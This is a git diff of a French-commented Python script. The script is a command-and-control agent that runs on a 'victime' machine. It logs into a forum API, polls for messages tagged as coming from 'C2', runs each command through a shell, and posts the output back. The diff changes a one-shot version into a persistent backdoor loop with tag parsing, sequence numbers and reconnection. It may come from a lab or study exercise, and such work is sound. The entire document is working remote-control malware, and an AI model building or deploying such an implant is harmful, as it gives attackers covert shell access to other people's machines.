@@ -2,73 +2,155 @@ import requests
 import time
 import subprocess
 
-USER = "victime_2"
+
+# Config victime
+USER = "victime_2"          # nom de la victime (cible)
 PASSWORD = "testtest"
-IP = "127.0.0.1"
-PORT = 6000  # le backend Flask écoute ici
+IP = "192.168.1.8"
+PORT = 6000                 # backend du forum
+MASTER = "C2"               # émetteur attendu (doit matcher [FROM=...])
 
-find = False
+POLL_INTERVAL_SEC = 2
+CMD_TIMEOUT_SEC = 60
 
-# Auth
-response = requests.post(
-    f"http://{IP}:{PORT}/api/auth/login",
-    json={"username": USER, "password": PASSWORD},
-)
-response.raise_for_status()
-token = response.json()["token"]
-headers = {"Authorization": f"Bearer {token}"}
 
-# définir un premier last (placeholder)
-last = {'body': 'vide', 'createdAt': '2000-01-22T17:15:13.611397', 'id': 0, 'username': 'C2'}
-
-# --- baseline : on récupère l'id max actuel de C2 avant d'attendre une nouvelle commande ---
-resp = requests.get(f"http://{IP}:{PORT}/api/messages", headers=headers)
-resp.raise_for_status()
-messages = resp.json()
-base_id = max((m["id"] for m in messages if m["username"] == "C2"), default=0)
-print(f"[baseline] dernier id connu de C2 = {base_id}")
-
-# boucle jusqu'à trouver un message de C2 avec id > base_id
-while not find:
-    resp = requests.get(f"http://{IP}:{PORT}/api/messages", headers=headers)
-    resp.raise_for_status()
-    for message in resp.json():
-        body = message["body"]
-        username = message["username"]
-        mid = message["id"]
-
-        # si message venant de C2 et id strictement supérieur à la baseline
-        if username == "C2" and mid > base_id:
-            last = message.copy()
-            print("coucou — nouveau message trouvé :", last)
-            find = True
-            break
-
-    if not find:
-        print("fin (rien de nouveau), attente 2s...")
-        time.sleep(2)
-
-# Exécution de la commande récupérée
-try:
-    result = subprocess.run(
-        last['body'],                      # la commande
-        shell=True,
-        text=True,
-        timeout=60,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,  # fusionne stderr -> stdout
+def login(ip: str, port: int, user: str, password: str) -> str:
+    r = requests.post(
+        f"http://{ip}:{port}/api/auth/login",
+        json={"username": user, "password": password},
     )
-    retour = result.stdout
-except Exception as e:
-    retour = f"[ERREUR EXEC] {e}"
+    r.raise_for_status()
+    return r.json()["token"]
 
-print("Sortie de la commande:\n", retour)
 
-# Envoi du résultat au serveur
-response = requests.post(
-    f"http://{IP}:{PORT}/api/messages",
-    headers=headers,
-    json={"body": retour},
-)
-response.raise_for_status()
-print("Résultat envoyé.")
+def get_messages(ip: str, port: int, token: str):
+    r = requests.get(
+        f"http://{ip}:{port}/api/messages",
+        headers={"Authorization": f"Bearer {token}"},
+    )
+    r.raise_for_status()
+    return r.json()
+
+
+def send_result(ip: str, port: int, token: str, result_text: str, seq: str | None = None):
+    # Résultat simple en texte (lisible par l’op)
+    tagged = f"[FROM={USER}];[TO={MASTER}];[SEQ={seq if seq is not None else ''}]; {result_text}"
+    r = requests.post(
+        f"http://{ip}:{port}/api/messages",
+        headers={"Authorization": f"Bearer {token}"},
+        json={"body": tagged},
+    )
+    r.raise_for_status()
+
+
+def parse_tagged_command(body: str, expected_from: str, expected_to: str):
+    """
+    Attend un format:
+      [FROM=C2];[TO=victime_2];[SEQ=42]; commande à exécuter
+    Retourne (commande, seq) si l’en-tête est valide et destiné à expected_to,
+    sinon (None, None).
+    """
+    if not (isinstance(body, str) and body.startswith("[FROM=")):
+        return None, None
+    try:
+        parts = body.split("];")
+        # parts exemple:
+        # ['[FROM=C2', '[TO=victime_2', '[SEQ=42', ' commande...']
+        if len(parts) < 4:
+            return None, None
+
+        from_part = parts[0]  # "[FROM=C2"
+        to_part = parts[1]    # "[TO=victime_2"
+        seq_part = parts[2]   # "[SEQ=42"
+        cmd_part = "];".join(parts[3:]).strip()
+
+        sender = from_part.split("=", 1)[1].rstrip("]")
+        target = to_part.split("=", 1)[1].rstrip("]")
+        seq = seq_part.split("=", 1)[1].rstrip("]")
+
+        if sender != expected_from or target != expected_to:
+            return None, None
+
+        return cmd_part, seq
+    except Exception:
+        return None, None
+
+
+def main():
+    token = login(IP, PORT, USER, PASSWORD)
+
+    # baseline: dernier id connu (on prend le max global pour ne pas rater)
+    try:
+        messages = get_messages(IP, PORT, token)
+        last_seen_id = max((m.get("id", 0) for m in messages), default=0)
+    except Exception:
+        last_seen_id = 0
+
+    print(f"[{USER}] prêt. Attente de commandes de {MASTER}... (last_seen_id={last_seen_id})")
+
+    while True:
+        try:
+            messages = get_messages(IP, PORT, token)
+
+            new_cmd = None
+            seq = None
+            chosen_id = last_seen_id
+
+            for msg in messages:
+                mid = msg.get("id", 0)
+                if mid <= last_seen_id:
+                    continue
+                body = msg.get("body", "")
+                cmd, s = parse_tagged_command(body, expected_from=MASTER, expected_to=USER)
+                if cmd:
+                    new_cmd = cmd.strip()
+                    seq = s
+                    chosen_id = mid
+                    break
+
+            if not new_cmd:
+                time.sleep(POLL_INTERVAL_SEC)
+                continue
+
+            last_seen_id = chosen_id
+
+            # exit => se terminer proprement
+            if new_cmd.lower() == "exit":
+                send_result(IP, PORT, token, f"{USER} exit.", seq)
+                print("Exit reçu, arrêt.")
+                break
+
+            # exécuter la commande
+            try:
+                result = subprocess.run(
+                    new_cmd,
+                    shell=True,
+                    text=True,
+                    timeout=CMD_TIMEOUT_SEC,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                )
+                output = result.stdout
+            except Exception as e:
+                output = f"[ERREUR EXEC] {e}"
+
+            # envoyer le résultat
+            send_result(IP, PORT, token, output, seq)
+
+            time.sleep(0.3)
+
+        except requests.RequestException as e:
+            print(f"[network] {e}, retry in {POLL_INTERVAL_SEC}s")
+            time.sleep(POLL_INTERVAL_SEC)
+            try:
+                token = login(IP, PORT, USER, PASSWORD)
+            except Exception:
+                pass
+        except Exception as e:
+            print(f"[loop] erreur: {e}")
+            time.sleep(POLL_INTERVAL_SEC)
+
+    print("Agent arrêté.")
+
+if __name__ == "__main__":
+    main()
